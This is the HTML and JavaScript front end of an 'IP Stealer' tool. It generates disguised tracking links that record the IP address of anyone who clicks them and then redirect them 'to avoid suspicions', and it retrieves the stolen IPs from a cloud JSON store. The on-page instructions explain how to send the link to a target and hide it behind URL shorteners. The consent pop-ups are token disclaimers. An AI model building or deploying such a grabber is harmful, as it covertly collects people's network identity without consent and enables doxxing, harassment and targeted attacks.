<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Gateway URL Generator</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />

  <style>
    body {
      font-family: system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
      background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
      color: #fff;
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      margin: 0;
    }

    .card {
      background: rgba(255, 255, 255, 0.1);
      backdrop-filter: blur(12px);
      border-radius: 14px;
      padding: 24px;
      width: 100%;
      max-width: 420px;
      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
    }

    h1 {
      margin-top: 0;
      text-align: center;
      font-size: 1.4rem;
    }

    label {
      font-size: 0.85rem;
      opacity: 0.85;
    }

    input {
      width: 94.4%;
      margin-top: 6px;
      margin-bottom: 16px;
      padding: 10px 12px;
      border-radius: 8px;
      border: none;
      font-size: 0.95rem;
    }

    button {
      width: 100%;
      padding: 12px;
      border: none;
      border-radius: 10px;
      background: #00d4ff;
      color: #000;
      font-weight: 600;
      font-size: 1rem;
      cursor: pointer;
    }

    button:hover {
      background: #00bfe6;
    }

    .result {
      margin-top: 18px;
      word-break: break-all;
      font-size: 0.9rem;
    }

    .result span {
      color: #00eaff;
      text-decoration: none;
    }

    .copy-btn {
      margin-top: 10px;
      background: #ffffff22;
      color: #fff;
    }

    .copy-btn:hover {
      background: #ffffff33;
    }

    .results-btn {
      margin-top: 10px;
      background: #00a2ff93;
      color: #fff;
    }

    .results-btn:hover {
      background: #00a2ff;
    }
    span{
      font-size: 0.8rem;
      opacity: 0.8;
    }
    #IP{
      display: block;
      margin-top: 20px;
      font-size: 3rem;
      font-weight: bold;
      text-align: center;
    }
  </style>
</head>
<body>

  <div class="card" id="Generator">
    <h1>IP Stealer</h1>
    <h3>URL Generator</h3>
    <span><b>Instructions:</b> Enter a redirect URL below to generate a link that will steal the IP address of anyone who clicks it, and redirects them to the specified URL (to avoid suspicions).</span>

    <b><label for="redirect" style="display: block; margin-top:10px;">Redirect URL</label></b>
    <input
      id="redirect"
      type="url"
      placeholder="https://example.com"
      required
    />

    <button onclick="generateLink()">Generate Link</button>

    <div class="result" id="result"></div>
    <span id="info1" style="display: none;">This is the link you send to the person you want to steal their IP. To make it less suspicious, use a short URL service like bit.ly or tinyurl.com.</span>
    <button class="copy-btn" id="copyBtn" style="display:none" onclick="copyLink()">
      Copy to Clipboard
    </button>
    <button class="results-btn" id="resultsBtn" style="display:none" onclick="showResults()">
      Check Results
    </button>
    <span id="info2" style="display: none; margin-top:10px;">Note: The generated link is only guaranteed valid for 96 hours. Afterwards, there is a likely chance that the link will still be active, however the stolen IP may be overwritten by other users (however this is currently highly unlikely).</span>
  </div>
  <div class="card" id="Results" style="display:none;">
    <h1>IP Stealer</h1>
    <h3>Results (Stolen IP)</h3>
    <span id="IP">Fetching...</span>
    <span style="display:none;" id="Help Message"><b>What does this mean? </b>The targeted user has not clicked on the link yet so no IP address has been stolen yet, or there was an error saving the IP address to cloud, often due to too many requests in one day.</span>
    <button class="copy-btn" id="copyBtn2" style="display:none" onclick="copyIP()">
      Copy to Clipboard
    </button>
    <span>Powered by ipify.org</span>
  </div>

  <script>
    // Parse URL parameters
    const params = new URLSearchParams(window.location.search);
    const id = params.get("id");

    if (!id) {
      console.warn("No ID provided in URL. Opening generator...");
    } else {
      document.getElementById("Generator").style.display = "none";
      document.getElementById("Results").style.display = "block";

      const keyName = id; // this is stored in a variable

      fetch("https://api.jsonstorage.net/v1/json/a2e95c6f-02c1-433e-8a1e-650992a971f1/4386bb18-5345-4061-bf5b-cbeab140cd50")
        .then(response => {
          if (!response.ok) throw new Error("Network response was not OK");
          return response.json();
        })
        .then(data => {
          const value = data[keyName]; // ðŸ‘ˆ important part
          console.log("Value for key:", keyName, value);
          document.getElementById("IP").innerText = value
            ? value
            : "No IP found.";
          if (!value) {
            document.getElementById("Help Message").style.display = "block";
          } else {
            document.getElementById("copyBtn2").style.display = "block";
          }
        })
        .catch(error => {
          console.error("GET error:", error);
          document.getElementById("IP").innerText = "Error fetching IP.";
        });
    }

    function generate6DigitTimeCode(date = new Date()) {
        const month = date.getMonth() + 1;
        const day = date.getDate();
        const hour = date.getHours();
        const minute = date.getMinutes();
        const second = date.getSeconds();

        // Convert everything into total seconds
        const totalSeconds =
            ((((month * 31 + day) * 24 + hour) * 60 + minute) * 60) +
            second;

        // Scramble while keeping uniqueness window
        const code = (totalSeconds * 7919) % 1_000_000;

        // Convert to string and remove leading zeroes
        return String(code).replace(/^0+/, "") || "0";
        }

    let lastGeneratedURL = "";

    function generateLink() {
      const redirectInput = document.getElementById("redirect");
      const result = document.getElementById("result");
      const copyBtn = document.getElementById("copyBtn");

      if (!redirectInput.value) {
        alert("Please enter a redirect URL.");
        return;
      }
      if (!confirm("By generating this link, you agree to use it responsibly and ethically. Misuse of this tool may be illegal and unethical. Do you wish to proceed?")) {
        return;
      }

      const id = generate6DigitTimeCode();
      document.id = id;
      const encodedRedirect = encodeURIComponent(redirectInput.value);

      lastGeneratedURL =
        `https://chibbit-99.github.io/gateway?id=${id}&redirect=${encodedRedirect}`;

      result.innerHTML = `
        <strong>Generated Link:</strong><br>
        <span href="${lastGeneratedURL}" target="_blank">
          ${lastGeneratedURL}
        </span>
      `;

      copyBtn.style.display = "block";
      document.getElementById("resultsBtn").style.display = "block";
      document.getElementById("info1").style.display = "block";
      document.getElementById("info2").style.display = "block";
    }

      function copyLink() {
        navigator.clipboard.writeText(lastGeneratedURL);
        alert("Link copied to clipboard!");
      }

      function copyIP() {
        if (confirm("Upon copying the IP address, you confirm that you will not use this information for malicious purposes. Misuse of this tool may be illegal and unethical. Do you wish to proceed?")) {
          navigator.clipboard.writeText(document.getElementById("IP").innerText);
          alert("IP copied to clipboard!");
        } else {
          alert("Copying cancelled.");
        }
      }

    function showResults() {
      const resultsURL = `https://chibbit-99.github.io/IP-Address-Stealer/?id=${document.id}`;
      window.open(resultsURL, "_blank");
    }
  </script>

</body>
</html>
